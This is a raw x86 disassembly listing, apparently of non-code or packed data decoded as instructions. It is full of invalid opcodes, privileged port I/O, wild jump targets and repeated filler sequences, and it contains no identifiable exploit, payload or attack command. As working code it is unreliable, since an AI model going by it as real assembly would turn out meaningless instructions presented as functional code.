  413967:	repz add al,0x60
  41396a:	add    eax,0x3870f90d
  41396f:	xchg   eax,eax
  413971:	in     eax,0xc4
  413973:	and    BYTE PTR [edi+0x3de87d17],al
  413979:	bound  ebp,QWORD PTR [edx-0x40c3f347]
  41397f:	add    cl,BYTE PTR [ecx+0x6f336be]
  413985:	push   0xe900fdd8
  41398a:	stc    
  41398b:	or     eax,0x456cf5b5
  413990:	add    BYTE PTR [eax-0x30],dh
  413993:	(bad)  
  413994:	in     eax,dx
  413995:	out    0x7e,eax
  413997:	jmp    0x413995
  413999:	jmp    0x5e4a3e97
  41399e:	lea    edx,[ebp+0x3f]
  4139a1:	jmp    0x87011ca4
  4139a6:	imul   eax,DWORD PTR [ebp+0x4f98de5],0x0
  4139ad:	repnz enter 0x4d0d,0x28
  4139b2:	test   BYTE PTR [ebx+0x7d73],0x0
	...
  4139c5:	add    BYTE PTR [eax],al
  4139c7:	add    dh,dl
  4139c9:	mov    DWORD PTR [ecx-0x2e72b257],0xde8d501a
  4139d3:	push   0x1b
  4139d5:	inc    ebx
  4139d6:	mov    DWORD PTR ds:0xa8560dcb,ebx
  4139dc:	stc    
  4139dd:	or     eax,0x80e70073
  4139e2:	faddp  st(1),st
  4139e4:	lods   al,BYTE PTR ds:[esi]
  4139e5:	add    edi,DWORD PTR [edi-0x19]
  4139e8:	iret   
  4139e9:	add    eax,0x57180000
  4139ee:	or     DWORD PTR [edx+edx*2+0x6],edx
  4139f2:	xchg   edi,ebx
  4139f4:	rcr    BYTE PTR [esi],cl
  4139f6:	or     eax,DWORD PTR [ecx-0x2f5fc]
  4139fc:	jecxz  0x413a00
  4139fe:	mov    bh,0xc
  413a00:	or     eax,0x48fc88fd
  413a06:	out    dx,al
  413a07:	push   ss
  413a08:	bound  esp,QWORD PTR [edi]
  413a0a:	stc    
  413a0b:	add    bl,ah
  413a0d:	add    eax,0xb5cfb709
  413a12:	inc    eax
  413a13:	add    dl,ah
  413a15:	adc    eax,0x87cb4dfe
  413a1a:	jl     0x413a14
  413a1c:	mov    ds:0xbdab84fc,eax
  413a21:	or     edi,esi
  413a23:	mov    DWORD PTR [ebx+0x45],ebp
  413a26:	fstp   QWORD PTR [edi]
  413a28:	sbb    bh,BYTE PTR [edi]
  413a2a:	shr    dh,1
	...
  413a3c:	add    BYTE PTR [eax],al
  413a3e:	sbb    al,BYTE PTR [esi+0x8]
  413a41:	icebp  
  413a42:	or     bh,BYTE PTR [ecx]
  413a44:	xor    al,cl
  413a46:	or     cl,BYTE PTR [eax-0x80]
  413a49:	jecxz  0x413a04
  413a4b:	bound  esp,QWORD PTR [edi+0x302f52aa]
  413a51:	fldl2e 
  413a53:	cmp    al,al
  413a55:	loopne 0x413a93
  413a57:	jle    0x413a2c
  413a59:	sar    DWORD PTR [ebp+0x7d],1
  413a5c:	mov    edi,0xcd7dd109
  413a61:	shr    DWORD PTR [ebx-0x3537cf00],0x47
  413a68:	and    bl,0xfa
  413a6b:	pop    edx
  413a6c:	add    al,0xff
  413a6e:	cli    
  413a6f:	sbb    al,0x29
  413a71:	mov    BYTE PTR [edx+0x2c],al
  413a74:	and    al,0x7
  413a76:	jmp    0x413aa5
  413a78:	jns    0x413a49
  413a7a:	cmp    eax,DWORD PTR [ebx+0x6]
  413a7d:	xor    DWORD PTR [edx+0x64],eax
  413a80:	inc    ebx
  413a81:	sbb    BYTE PTR [ecx],0xde
  413a84:	aam    0x32
  413a86:	leave  
  413a87:	fsubr  QWORD PTR [edx]
  413a89:	mov    dl,dl
  413a8b:	sub    eax,0x2c2b0124
  413a90:	jns    0x413a59
  413a92:	mov    ebx,0xca30f416
  413a97:	jne    0x413adc
  413a99:	sbb    cl,0xf7
  413a9c:	or     bh,bh
  413a9e:	int    0xbd
  413aa0:	sub    ecx,DWORD PTR [eax+0x0]
	...
  413ab2:	add    BYTE PTR [eax],al
  413ab4:	mov    ds:0xb0f21ad,al
  413ab9:	lods   eax,DWORD PTR ds:[esi]
  413aba:	jp     0x413a83
  413abc:	mov    ebx,0xca30fdc6
  413ac1:	gs inc esp
  413ac3:	sbb    BYTE PTR [ecx-0x12f10709],0xfc
  413aca:	sub    ecx,DWORD PTR [edx-0x1dbd19c1]
  413ad0:	idiv   ah
  413ad2:	cmp    al,0x88
  413ad4:	loop   0x413b40
  413ad6:	mov    esi,0xbe72f607
  413adb:	pop    es
  413adc:	cmp    esi,0xffffffa8
  413adf:	pop    ebp
  413ae0:	shl    DWORD PTR [ebp+edx*1+0x5c],1
  413ae4:	cmp    dh,dh
  413ae6:	add    DWORD PTR [ebx-0x3c],edx
  413ae9:	jb     0x413a90
  413aeb:	and    eax,DWORD PTR [esi]
  413aed:	adc    BYTE PTR [ebx+0x73],bh
  413af0:	push   ss
  413af1:	ficomp WORD PTR [edi-0x9fab37c]
  413af7:	outs   dx,DWORD PTR ds:[esi]
  413af8:	sub    dl,BYTE PTR [eax]
  413afa:	xchg   ebp,eax
  413afb:	inc    edx
  413afc:	add    al,0xb8
  413afe:	daa    
  413aff:	mov    bl,0x7e
  413b01:	inc    esp
  413b02:	fbstp  TBYTE PTR [ebx+0x8415a1d]
  413b08:	sbb    al,0x6d
  413b0a:	jmp    0x413ac2
  413b0c:	mov    edx,0x11fc3f04
  413b11:	add    BYTE PTR [edi],ch
  413b13:	clc    
  413b14:	dec    esp
  413b15:	idiv   DWORD PTR [ebp+0xb4]
	...
  413b27:	add    BYTE PTR [eax],al
  413b29:	add    BYTE PTR ds:0xf4082146,dl
  413b2f:	ins    BYTE PTR es:[edi],dx
  413b30:	arpl   WORD PTR [esi+0xfff053a],si
  413b36:	loopne 0x413b37
  413b38:	push   es
  413b39:	test   eax,0x3efc340
  413b3e:	das    
  413b3f:	mov    cs,WORD PTR [ebx+esi*4]
  413b42:	cmp    eax,0xfdbe6254
  413b47:	mov    eax,DWORD PTR [eax+edi*8+0x6e]
  413b4b:	pop    ecx
  413b4c:	fbstp  TBYTE PTR [edx+0x824ed45]
  413b52:	lods   al,BYTE PTR ds:[esi]
  413b53:	(bad)  
  413b54:	aas    
  413b55:	js     0x413b88
  413b57:	inc    esi
  413b58:	out    0x78,eax
  413b5a:	ss std 
  413b5c:	pop    ss
  413b5d:	sbb    al,0x8c
  413b5f:	add    BYTE PTR [edi+0x1c111507],dh
  413b65:	lds    eax,FWORD PTR [ebp+0x2d0c2c90]
  413b6b:	in     eax,dx
  413b6c:	nop
  413b6d:	or     BYTE PTR [edi+edi*8-0x1],dh
  413b71:	ja     0x413b31
  413b73:	inc    ebp
  413b74:	out    0x78,eax
  413b76:	mov    esi,0x401c17fc
  413b7b:	add    BYTE PTR [edi+0x7],bh
  413b7e:	test   al,0x91
  413b80:	add    BYTE PTR [esi+edi*8],ch
  413b83:	dec    edi
  413b84:	call   0xfe402df4
  413b89:	ret    0xebbe
  413b8c:	pop    ebx
  413b8d:	sub    eax,DWORD PTR [eax]
	...
  413b9f:	add    BYTE PTR [esi],dh
  413ba1:	call   DWORD PTR [eax+eiz*2-0x25]
  413ba5:	sub    ah,0xf9
  413ba8:	push   0x21a48959
  413bad:	mov    dh,BYTE PTR [ebx-0x13]
  413bb0:	xchg   edx,eax
  413bb1:	dec    eax
  413bb2:	clc    
  413bb3:	cdq    
  413bb4:	dec    eax
  413bb5:	out    0xfa,eax
  413bb7:	xor    bh,ch
  413bb9:	dec    BYTE PTR [ebx-0x7eb01654]
  413bbf:	sub    dh,dh
  413bc1:	push   ebx
  413bc2:	call   0xfe403ccb
  413bc7:	sub    DWORD PTR [ebp+0x4a],0x4962e93f
  413bce:	clc    
  413bcf:	cdq    
  413bd0:	icebp  
  413bd1:	xchg   esi,eax
  413bd2:	cld    
  413bd3:	div    ah
  413bd5:	mov    WORD PTR gs:[ebp+0x2c8cfebe],ds
  413bdc:	out    0x4d,al
  413bde:	call   0xfe403953
  413be3:	bound  esp,QWORD PTR [edx-0x6]
  413be6:	mov    DWORD PTR [esi+ecx*1],esp
  413be9:	lea    eax,[ebx-0x3b]
  413bec:	push   ds
  413bed:	popa   
  413bee:	lock push ecx
  413bf0:	xchg   edx,eax
  413bf1:	push   ecx
  413bf2:	aas    
  413bf3:	jmp    0x1a39850a
  413bf8:	out    0x6e,al
  413bfa:	cld    
  413bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bfc:	hlt    
  413bfd:	gs or  al,0x2c
  413c00:	aas    
  413c01:	dec    BYTE PTR [esp+ebp*1+0x0]
	...
  413c14:	add    BYTE PTR [eax],al
  413c16:	push   es
  413c17:	dec    esi
  413c18:	call   0xfe402e25
  413c1d:	add    al,ch
  413c1f:	lods   al,BYTE PTR ds:[esi]
  413c20:	stc    
  413c21:	mov    ebx,DWORD PTR [esi]
  413c23:	sbb    DWORD PTR [eax+0x5c80c745],ecx
  413c29:	lock sti 
  413c2b:	jl     0x413c79
  413c2d:	inc    ecx
  413c2e:	push   ebx
  413c2f:	jge    0x413c75
  413c31:	clc    
  413c32:	jae    0x413c4e
  413c34:	inc    esi
  413c35:	cld    
  413c36:	les    eax,FWORD PTR [esi]
  413c38:	mov    WORD PTR gs:[esi+0x4e8cfdc9],es
  413c3f:	adc    cl,BYTE PTR [ebp-0x18]
  413c42:	cli    
  413c43:	or     al,0xfe
  413c45:	jmp    FWORD PTR [ebp+0x7d]
  413c48:	inc    esp
  413c49:	clc    
  413c4a:	arpl   WORD PTR [edx],bx
  413c4c:	(bad)  
  413c4e:	aam    0x6
  413c50:	add    dh,0xeb
  413c53:	scas   eax,DWORD PTR es:[edi]
  413c54:	mov    WORD PTR [ebp+0x13],es
  413c57:	mov    dl,0xe5
  413c59:	ror    DWORD PTR [eax],cl
  413c5b:	pop    es
  413c5c:	(bad)  
  413c5d:	pop    esi
  413c5e:	cwde   
  413c5f:	sub    cl,0x5d
  413c62:	and    edx,edi
  413c64:	std    
  413c65:	push   esp
  413c66:	pop    edx
  413c67:	and    eax,0x927ec80
  413c6c:	add    BYTE PTR [eax],al
  413c6e:	add    BYTE PTR [edi+0xf68b56],ch
  413c74:	mov    esi,DWORD PTR [ebp-0x69]
  413c77:	jbe    0x413bfd
  413c79:	add    BYTE PTR [eax],0x0
	...
  413c8c:	mov    ch,0x7
  413c8e:	(bad)  
  413c8f:	push   eax
  413c90:	retf   
  413c91:	inc    ebp
  413c92:	add    BYTE PTR [eax],al
  413c94:	mov    ds:0x9767fd9b,eax
  413c99:	mov    bh,0x40
  413c9b:	add    BYTE PTR [ebx+0x54fffb71],bh
  413ca1:	ror    edi,1
  413ca3:	mov    ah,cl
  413ca5:	cld    
  413ca6:	dec    ebx
  413ca7:	inc    ecx
  413ca8:	cli    
  413ca9:	jmp    0x413d24
  413cab:	add    ebp,DWORD PTR [eax]
  413cad:	sub    bh,BYTE PTR [edi-0x7]
  413cb0:	repnz pop es
  413cb2:	adc    esi,eax
  413cb4:	jg     0x413cb9
  413cb6:	push   es
  413cb7:	dec    BYTE PTR [ebp-0x14]
  413cba:	add    DWORD PTR [eax],eax
  413cbc:	cli    
  413cbd:	xor    BYTE PTR [eax+0x7d744a88],0x73
  413cc4:	xor    al,0x5e
  413cc6:	add    esi,DWORD PTR [eax]
  413cc8:	dec    eax
  413cc9:	inc    edx
  413cca:	aam    0x8a
  413ccc:	jg     0x413ca5
  413cce:	add    edi,esi
  413cd0:	sbb    eax,0x147b7d74
  413cd5:	ds add edi,esi
  413cd8:	ja     0x413c99
  413cda:	add    edi,esi
  413cdc:	add    eax,0xfc7b7562
  413ce1:	and    eax,0xefb40e03
  413ce6:	sbb    bh,0x6d
  413ce9:	addr16 inc ebp
  413ceb:	jnp    0x413cd1
  413ced:	or     eax,DWORD PTR [ebx]
  413cef:	push   cs
	...
  413d00:	add    BYTE PTR [eax],al
  413d02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d03:	ret    
  413d04:	shl    bh,cl
  413d06:	sub    ch,0x3b
  413d09:	add    bh,dl
  413d0b:	scas   al,BYTE PTR es:[edi]
  413d0c:	mov    edi,0x86e6c082
  413d11:	add    al,0x7a
  413d13:	daa    
  413d14:	add    al,0x75
  413d16:	mov    esp,0x21e7ae34
  413d1b:	aam    0x4
  413d1d:	(bad)  
  413d1e:	jns    0x413ca1
  413d20:	mov    ebp,edi
  413d22:	popf   
  413d23:	ret    
  413d24:	add    DWORD PTR [eax-0x5971122f],eax
  413d2a:	jns    0x413d9d
  413d2c:	mov    ebp,edi
  413d2e:	test   DWORD PTR [ebx+0x55c7501],ebp
  413d34:	je     0x413db4
  413d36:	cmc    
  413d37:	cli    
  413d38:	sahf   
  413d39:	add    al,0xbd
  413d3b:	in     al,dx
  413d3c:	push   cs
  413d3d:	add    edi,edx
  413d3f:	add    al,0x2e
  413d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d42:	ror    BYTE PTR [ebp+0xd3ba693],0xe7
  413d49:	scas   al,BYTE PTR es:[edi]
  413d4a:	and    dl,0x68
  413d4d:	pop    ss
  413d4e:	jno    0x413d56
  413d50:	out    0x3,eax
  413d52:	test   eax,0xd678be52
  413d57:	or     al,0x72
  413d59:	mov    es,WORD PTR [ecx]
  413d5b:	mov    ch,BYTE PTR [ebx+eax*4+0x27]
  413d5f:	cld    
  413d60:	dec    esi
  413d61:	mov    bl,0x15
  413d63:	cld    
  413d64:	out    0x3,eax
	...
  413d76:	add    BYTE PTR [eax],al
  413d78:	cli    
  413d79:	outs   dx,BYTE PTR ds:[esi]
  413d7a:	out    0x9b,eax
  413d7c:	add    DWORD PTR [ebx-0x58],ecx
  413d7f:	add    edx,DWORD PTR [edx]
  413d81:	fsubr  DWORD PTR [esp+eax*1]
  413d84:	cld    
  413d85:	xor    eax,0x87b7939
  413d8a:	lods   eax,DWORD PTR ds:[esi]
  413d8b:	ret    0x83ed
  413d8e:	jmp    0x413d61
  413d90:	cmp    ecx,DWORD PTR [eax-0x99e0cef]
  413d96:	cs jle 0x413de6
  413d99:	sti    
  413d9a:	inc    BYTE PTR [ebx]
  413d9c:	cli    
  413d9d:	add    al,0xe7
  413d9f:	add    edx,ecx
  413da1:	push   eax
  413da2:	pusha  
  413da3:	adc    esi,DWORD PTR [edx-0x7f]
  413da6:	pop    ebx
  413da7:	add    dh,BYTE PTR [ebx+edi*8+0x34a3d618]
  413dae:	bound  ecx,QWORD PTR [ecx+0x3cefb2e]
  413db4:	jb     0x413d37
  413db6:	inc    ebx
  413db7:	add    dl,BYTE PTR [ebx+edi*8-0x4f97642]
  413dbe:	add    BYTE PTR [esi+0x2d8b8ef9],dh
  413dc4:	clc    
  413dc5:	cli    
  413dc6:	std    
  413dc7:	idiv   BYTE PTR [ebx]
  413dc9:	add    eax,0x8d798981
  413dce:	mov    ebx,0xfdfaf815
  413dd3:	fisub  WORD PTR [ebx-0x797ed0c7]
  413dd9:	sti    
  413dda:	ret    
  413ddb:	jmp    0x0:0x0
	...
  413dee:	stc    
  413def:	inc    ebp
  413df0:	inc    edx
  413df1:	push   0x44
  413df3:	adc    al,0x7b
  413df5:	in     al,0x79
  413df7:	cmp    eax,0x5243dc00
  413dfc:	push   esi
  413dfd:	push   ecx
  413dfe:	clc    
  413dff:	clc    
  413e00:	std    
  413e01:	push   esi
  413e02:	jge    0x413dab
  413e04:	js     0x413e55
  413e06:	stc    
  413e07:	cli    
  413e08:	add    BYTE PTR [ecx-0x2b],ch
  413e0b:	add    al,0x73
  413e0d:	xchg   BYTE PTR [ebp-0x41],dh
  413e10:	js     0x413e49
  413e12:	stc    
  413e13:	cli    
  413e14:	add    BYTE PTR [ebx+ebx*2-0x7967c71],dh
  413e1b:	cli    
  413e1c:	std    
  413e1d:	mov    ecx,0xe900a2e1
  413e22:	stc    
  413e23:	push   edi
  413e24:	pop    esi
  413e25:	mov    dl,0x6e
  413e27:	jmp    0x5476987
  413e2c:	push   ecx
  413e2d:	xchg   edi,eax
  413e2e:	xor    BYTE PTR [esp+eax*2-0x769d1633],cl
  413e35:	lea    edx,ds:0xd46c6611
  413e3b:	jbe    0x413e46
  413e3d:	jo     0x413e02
  413e3f:	mov    ?,WORD PTR [eax-0x7]
  413e42:	adc    edi,DWORD PTR [edi+0xd8ce8ff]
  413e48:	mov    eax,DWORD PTR [eax]
  413e4a:	rcl    DWORD PTR [eax],cl
  413e4c:	test   edi,eax
  413e4e:	xor    eax,0xfd230
	...
  413e63:	add    BYTE PTR [eax+edx*8],al
  413e66:	push   edx
  413e67:	adc    DWORD PTR [ebx+0xe],0x50
  413e6b:	call   0x3d3d57
  413e70:	or     edx,DWORD PTR ds:0xee534149
  413e76:	cmp    bh,cl
  413e78:	ins    BYTE PTR es:[edi],dx
  413e79:	pop    es
  413e7a:	push   cs
  413e7b:	mov    bh,0x98
  413e7d:	push   ebx
  413e7e:	push   ebx
  413e7f:	call   0x3d3dd7
  413e84:	sti    
  413e85:	xchg   esp,eax
  413e86:	dec    ecx
  413e87:	inc    ecx
  413e88:	push   ebx
  413e89:	out    dx,al
  413e8a:	es stc 
  413e8c:	pushf  
  413e8d:	push   es
  413e8e:	push   cs
  413e8f:	mov    bh,0xb8
  413e91:	push   edx
  413e92:	push   esi
  413e93:	call   0x3d3e07
  413e98:	dec    esp
  413e99:	fs push edi
  413e9b:	ret    0x60b
  413e9e:	dec    edi
  413e9f:	mov    ebp,DWORD PTR [edi+0x22]
  413ea2:	or     BYTE PTR [ebx-0x45],dl
  413ea5:	or     dh,ch
  413ea7:	dec    esp
  413ea9:	cmp    BYTE PTR [edi+0x5e380],0xb8
  413eb0:	fist   WORD PTR [ebp+edi*1+0x0]
  413eb4:	pop    eax
  413eb5:	push   ss
  413eb6:	test   DWORD PTR [ebx],edx
  413eb8:	push   eax
  413eb9:	mov    BYTE PTR [ebx+eax*4],0x20
  413ebd:	add    bh,BYTE PTR [ecx]
  413ebf:	mov    WORD PTR [esi-0x38dffc0],ds
  413ec5:	mov    ebp,0x4d8c
	...
  413eda:	xchg   edx,eax
  413edb:	add    eax,0x102a1087
  413ee0:	jg     0x413ea2
  413ee2:	xchg   edi,eax
  413ee3:	cmp    BYTE PTR [edi+0x1010fa04],0x4e
  413eea:	cmp    ebp,esp
  413eec:	jae    0x413edb
  413eee:	xor    DWORD PTR [esi+0x77290008],ebp
  413ef4:	pusha  
  413ef5:	and    al,0xf2
  413ef7:	push   ds
  413ef8:	in     al,dx
  413ef9:	call   0x8040e980
  413efe:	cmp    DWORD PTR [ebx+0x4],ebp
  413f01:	add    dl,bh
  413f03:	arpl   WORD PTR [eax],dx
  413f05:	dec    ebx
  413f06:	mov    ebx,0x73118ceb
  413f0b:	sti    
  413f0c:	test   cl,al
  413f0e:	(bad)  
  413f0f:	outs   dx,BYTE PTR ds:[esi]
  413f10:	les    eax,FWORD PTR [edi+ecx*1]
  413f13:	push   0xfdfa3f4d
  413f18:	lock mov eax,0x41186e
  413f1e:	cmp    esi,0x2e79108a
  413f24:	or     BYTE PTR [ecx+0xc3ee73a],al
  413f2a:	lods   al,BYTE PTR ds:[esi]
  413f2b:	lods   al,BYTE PTR ds:[esi]
  413f2c:	add    DWORD PTR [edx+0x25],esi
  413f2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f30:	ret    
  413f31:	add    al,0xfa
  413f33:	nop
  413f34:	mov    ah,bl
  413f36:	jns    0x413f77
  413f38:	sbb    al,0x51
  413f3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f3b:	pop    bp
  413f3d:	or     BYTE PTR [eax],al
	...
  413f4f:	add    BYTE PTR [ecx+0x378b0d99],al
  413f55:	es push esp
  413f57:	push   ecx
  413f58:	rol    BYTE PTR [ecx],cl
  413f5a:	cld    
  413f5b:	std    
  413f5c:	fstp   QWORD PTR [ecx+0x45]
  413f5f:	lock sub dh,BYTE PTR [ecx+0x43]
  413f63:	or     BYTE PTR [edx],ch
  413f65:	push   ss
  413f66:	in     al,0xf8
  413f68:	(bad)
  413f6b:	inc    ebx
  413f6c:	rcr    BYTE PTR [esi+0x50ac184],cl
  413f72:	cmp    ch,ah
  413f74:	retf   
  413f75:	std    
  413f76:	fiadd  WORD PTR [eax]
  413f78:	adc    ecx,DWORD PTR [ecx-0x7605bcdd]
  413f7e:	and    al,0xfc
  413f80:	sub    ch,ch
  413f82:	inc    esp
  413f83:	sti    
  413f84:	(bad)  
  413f85:	clc    
  413f86:	dec    edi
  413f87:	nop
  413f88:	ss inc esi
  413f8a:	out    0x8e,eax
  413f8c:	cmp    ebp,esi
  413f8e:	pop    ss
  413f8f:	in     al,dx
  413f90:	out    0xfd,eax
  413f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f93:	add    bl,ah
  413f95:	mov    BYTE PTR [ebx],ch
  413f97:	inc    ebx
  413f98:	cli    
  413f99:	mov    DWORD PTR [esp+ebp*8],ebp
  413f9c:	retf   0x8ec
  413f9f:	sti    
  413fa0:	push   edi
  413fa1:	clc    
  413fa2:	jb     0x414002
  413fa4:	dec    esi
  413fa5:	mov    WORD PTR [esp+esi*8],fs
  413fa8:	jge    0x413fec
  413faa:	jae    0x413f36
  413fac:	mov    eax,ds:0x2e5e62f4
  413fb1:	mov    WORD PTR [ebx+ebp*8+0x0],gs
	...
  413fc4:	add    BYTE PTR [eax],al
  413fc6:	jne    0x41400a
  413fc8:	push   ebx
  413fc9:	mov    al,cl
  413fcb:	in     al,dx
  413fcc:	mov    edi,0xe745b10f
  413fd1:	mov    ?,WORD PTR [ecx-0x2c146804]
  413fd7:	std    
  413fd8:	add    BYTE PTR ds:[ebx-0x5bd5bf8],dl
  413fdf:	mov    DWORD PTR [ebx+esi*8-0x52b12b6],esp
  413fe6:	out    dx,eax
  413fe7:	test   DWORD PTR [edi-0x18b9cef1],0xb7ed398e
  413ff1:	jmp    0x413fea
  413ff3:	std    
  413ff4:	push   es
  413ff5:	add    BYTE PTR [eax+0x398bfb59],al
  413ffb:	cmc    
  413ffc:	add    BYTE PTR [eax+0x34],ah
  413fff:	stc    
  414000:	xchg   DWORD PTR [ecx+ebp*4-0x7e22a473],ecx
  414007:	inc    ebx
  414008:	call   0x8832737d
  41400d:	xor    al,0x8e
  41400f:	ins    BYTE PTR es:[edi],dx
  414010:	mov    WORD PTR [edi+edi*1],ds
  414013:	add    eax,0x548e2c8b
  414018:	call   0xfe3ac6dd
  41401d:	inc    ecx
  41401e:	push   0x4b
  414020:	aas    
  414021:	jmp    0x3a3183b0
  414026:	pop    esi
  414027:	in     eax,dx
  414028:	clc    
  414029:	sahf   
	...
  41403a:	add    BYTE PTR [eax],al
  41403c:	gs ins BYTE PTR es:[edi],dx
  41403e:	mov    WORD PTR [edi+esi*4],fs
  414041:	add    al,0x8b
  414043:	and    al,0x66
  414045:	push   esp
  414046:	call   0xfe3a8eef
  41404b:	pop    ss
  41404c:	imul   eax,DWORD PTR [ebx-0x8],0x19
  414050:	dec    esi
  414051:	cmp    al,0x6e
  414054:	xor    eax,0xc9f1468b
  414059:	mov    eax,DWORD PTR [ebx+0x59]
  41405c:	into   
  41405d:	in     al,dx
  41405e:	jne    0x4140b1
  414060:	sbb    eax,0xee2781f9
  414065:	dec    esi
  414066:	mov    ebp,DWORD PTR [ecx+eiz*1+0x1d3e854]
  41406d:	stc    
  41406e:	std    
  41406f:	xchg   edi,eax
  414070:	mov    al,ds:0xbb8cec7f
  414075:	or     eax,0xe27ebc00
  41407a:	jg     0x414089
  41407c:	mov    dh,dh
  41407e:	std    
  41407f:	jmp    0x62968fcc
  414084:	pop    ebx
  414085:	or     eax,0x64e0089
  41408a:	mov    DWORD PTR [ebp-0x408ad],eax
  414090:	arpl   dx,bp
  414092:	push   esp
  414093:	(bad)  
  414094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414095:	imul   DWORD PTR [edx+0x0]
  414098:	dec    ebx
  414099:	adc    eax,0xea93414e
  41409e:	in     eax,0xfd
	...
  4140b0:	add    BYTE PTR [eax],al
  4140b2:	(bad)  
  4140b3:	imul   DWORD PTR ds:0xc8419d2
  4140b9:	dec    esi
  4140ba:	loop   0x4140bc
  4140bc:	mov    BYTE PTR [ecx+eax*4],al
  4140bf:	inc    esp
  4140c0:	jg     0x4140bc
  4140c2:	stos   DWORD PTR es:[edi],eax
  4140c3:	jbe    0x4140b2
  4140c5:	(bad)  
  4140c6:	fidivr WORD PTR [ecx-0x2]
  4140c9:	call   DWORD PTR [ecx+eax*1-0x14ad0000]
  4140d0:	push   esp
  4140d1:	mov    DWORD PTR [ebx-0x7a8b7e77],eax
  4140d7:	idiv   ebx
  4140d9:	xor    DWORD PTR [ecx-0x15],esi
  4140dc:	xor    BYTE PTR [ebx-0x19222],cl
  4140e2:	les    ecx,FWORD PTR [eax-0x95a837f]
  4140e8:	sti    
  4140e9:	call   FWORD PTR [esi-0x3b000193]
  4140ef:	mov    cl,BYTE PTR [ecx-0x4093a84]
  4140f5:	jne    0x3521bffe
  4140fb:	mov    edi,DWORD PTR [ecx-0x4093a84]
  414101:	(bad)  
  414103:	ss sub eax,0xc6015bf8
  414109:	add    esp,ebx
  41410b:	inc    edx
  41410c:	inc    edx
  41410d:	sbb    DWORD PTR [ecx],0x1a
  414110:	jns    0x414117
  414112:	cli    
  414113:	imul   edi,DWORD PTR [edx],0x0
	...
  414126:	add    BYTE PTR [eax],al
  414128:	dec    edi
  414129:	push   ds
  41412a:	push   ebx
  41412b:	push   esi
  41412c:	loop   0x4140b9
  41412e:	sti    
  41412f:	std    
  414130:	lds    ebp,FWORD PTR [edx-0x58]
  414133:	js     0x4140f1
  414135:	out    dx,al
  414136:	sti    
  414137:	add    BYTE PTR [edx-0x4e],bh
  41413a:	add    DWORD PTR [ebx+0x55],esi
  41413d:	push   0xffffffbd
  41413f:	js     0x4140e5
  414141:	(bad)  
  414142:	sti    
  414143:	add    BYTE PTR [edi],ah
  414145:	outs   dx,BYTE PTR ds:[esi]
  414146:	lea    eax,[ebx-0x2043a86]
  41414c:	sub    dl,ah
  41414e:	(bad)  
  41414f:	sti    
  414150:	test   DWORD PTR [esi+0x65215e5b],esi
  414156:	lock pop ebx
  414158:	cmp    bl,ah
  41415a:	add    DWORD PTR [ebx-0x7d],edx
  41415d:	mov    BYTE PTR [eax+edx*2-0x37],dl
  414161:	sub    eax,0x62f25387
  414166:	pop    ebp
  414167:	or     al,0x81
  414169:	adc    BYTE PTR [edi+ebp*1],dl
  41416c:	inc    ebx
  41416d:	jno    0x414177
  41416f:	(bad)  
  414171:	pop    ds
  414172:	or     eax,0x12e770f8
  414177:	mov    dh,bh
  414179:	aam    0x42
  41417b:	xor    DWORD PTR [ebx],0xc9eb7df3
  414181:	mov    ecx,0x4e20ace9
  414186:	sti    
  414187:	das    
  414188:	sub    BYTE PTR [eax+0x10],bl
  41418b:	sbb    al,BYTE PTR [eax]
	...
  41419d:	add    BYTE PTR [eax-0x4cdd019],al
  4141a3:	jae    0x4141a6
  4141a5:	inc    edx
  4141a6:	jns    0x4141d9
  4141a8:	or     al,0x7c
  4141aa:	jmp    0xfc05:0x368acfed
  4141b1:	sti    
  4141b2:	jb     0x4141bd
  4141b4:	fld    DWORD PTR [ecx+0x7b]
  4141b7:	out    dx,eax
  4141b8:	fistp  QWORD PTR [edi-0x35]
  4141bb:	push   ebx
  4141bc:	mov    dl,0x8a
  4141be:	ficom  WORD PTR [edx+0x29]
  4141c1:	adc    dl,bh
  4141c3:	add    al,0xe7
  4141c5:	add    edi,edx
  4141c7:	add    al,0xe7
  4141c9:	add    edi,edx
  4141cb:	add    al,0xe7
  4141cd:	add    edi,edx
  4141cf:	add    al,0xe7
  4141d1:	add    edi,edx
  4141d3:	add    al,0xe7
  4141d5:	add    edi,edx
  4141d7:	add    al,0xe7
  4141d9:	add    edi,edx
  4141db:	add    al,0xe7
  4141dd:	add    edi,edx
  4141df:	add    al,0xe7
  4141e1:	add    edi,edx
  4141e3:	add    al,0xe7
  4141e5:	add    edi,edx
  4141e7:	add    al,0xe7
  4141e9:	add    edi,edx
  4141eb:	add    al,0xe7
  4141ed:	add    edi,edx
  4141ef:	add    al,0xe7
  4141f1:	add    edi,edx
  4141f3:	add    al,0xe7
  4141f5:	add    edi,edx
  4141f7:	add    al,0xe7
  4141f9:	add    edi,edx
  4141fb:	add    al,0xe7
  4141fd:	add    edi,edx
  4141ff:	add    al,0xe7
  414201:	add    eax,DWORD PTR [eax]
	...
  414213:	add    dl,bh
  414215:	add    al,0xe7
  414217:	add    edi,edx
  414219:	add    al,0xe7
  41421b:	add    edi,edx
  41421d:	add    al,0xe7
  41421f:	add    edi,edx
  414221:	add    al,0xe7
  414223:	add    edi,edx
  414225:	add    al,0xe7
  414227:	add    edi,edx
  414229:	add    al,0xe7
  41422b:	add    edi,edx
  41422d:	add    al,0xe7
  41422f:	add    edi,edx
  414231:	add    al,0xe7
  414233:	add    edi,edx
  414235:	add    al,0xe7
  414237:	add    edi,edx
  414239:	add    al,0x0
  41423b:	jmp    0xe9414739
  414240:	stc    
  414241:	add    al,0x0
  414243:	jmp    0xe9414741
  414248:	stc    
  414249:	add    al,0x0
  41424b:	in     al,0x3
  41424d:	add    BYTE PTR [edx],cl
  41424f:	mov    BYTE PTR [ecx],ch
  414251:	inc    ecx
  414252:	mov    ebx,DWORD PTR [bx+di]
  414255:	jnp    0x414286
  414257:	iret   
  414258:	or     DWORD PTR [eax+eiz*1],esp
  41425b:	leave  
  41425c:	in     al,0x24
  41425e:	and    BYTE PTR [ebp+0x21],dh
  414261:	push   0x54135a20
  414266:	ins    BYTE PTR es:[edi],dx
  414267:	dec    ebp
  414268:	sbb    esi,DWORD PTR [edi+0x20]
  41426b:	pop    ebp
  41426c:	es push 0x791b4b20
  414272:	je     0x4142c0
